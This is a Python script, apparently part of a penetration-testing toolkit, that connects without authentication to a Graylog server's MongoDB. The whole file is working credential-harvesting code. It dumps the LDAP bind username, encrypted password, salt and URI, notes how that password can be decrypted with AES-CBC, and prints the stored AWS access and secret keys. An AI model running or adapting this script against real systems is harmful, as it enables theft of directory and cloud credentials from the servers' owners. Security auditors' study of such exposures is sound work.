#!/usr/bin/env python3

# Graylog Test Connection to MongoDB without Authentication and Read Sensitive Information

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
colorama.init()
from colorama import Fore, Style
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%% Functions %%%%%%%%%#

def testmongocredentials(graylogip):

    try:
        client = MongoClient(graylogip, 27017)
        db = client.graylog
        print(separator)
        print(Fore.RED+Style.BRIGHT+"[!] Mongo DB without Authentication"+Style.RESET_ALL)
        print(separator)
        print("[!] LDAP Settings")
        print(separator)

        ldapusername = list(db.ldap_settings.find({},{'system_username': 1,'_id':0}))
        ldappass = list(db.ldap_settings.find({}, {'system_password': 1, '_id': 0}))
        ldapsalt = list(db.ldap_settings.find({}, {'system_password_salt': 1, '_id': 0}))
        ldapuri = list(db.ldap_settings.find({}, {'ldap_uri': 1, '_id': 0}))

        print("[!] " + (str(ldapusername)).strip(' [{}]'))
        print("[!] " + (str(ldappass)).strip(' [{}]'))
        print("[!] " + (str(ldapsalt)).strip(' [{}]'))
        print("[!] " + (str(ldapuri)).strip(' [{}]'))

        print(separator)
        print("[!] LDAP Password Encrypted with AES CBC, Key is Graylog PasswordSecret and IV is the Salt")

        awsaccesskey = list(db.cluster_config.find({'type':'org.graylog.aws.config.AWSPluginConfiguration'},{'payload.access_key':1,'_id':0}))
        accesskey = str(awsaccesskey).replace('payload','').strip('[{}]').replace("'': {",'')
        awssecretkey = list(db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},{'payload.secret_key': 1, '_id': 0}))
        secretkey = str(awssecretkey).replace('payload', '').strip('[{}]').replace("'': {", '')

        print(separator)
        print("[!] AWS Access Key and Secret Key")
        print(separator)
        print("[!] " + accesskey)
        print("[!] " + secretkey)
        print(separator)

    except ConnectionFailure:
        print(separator)
        print("[!] Problem with MongoDB Authentication")
        print(separator)
        pass

#%%%%%%%%%% The End %%%%%%%%%%#
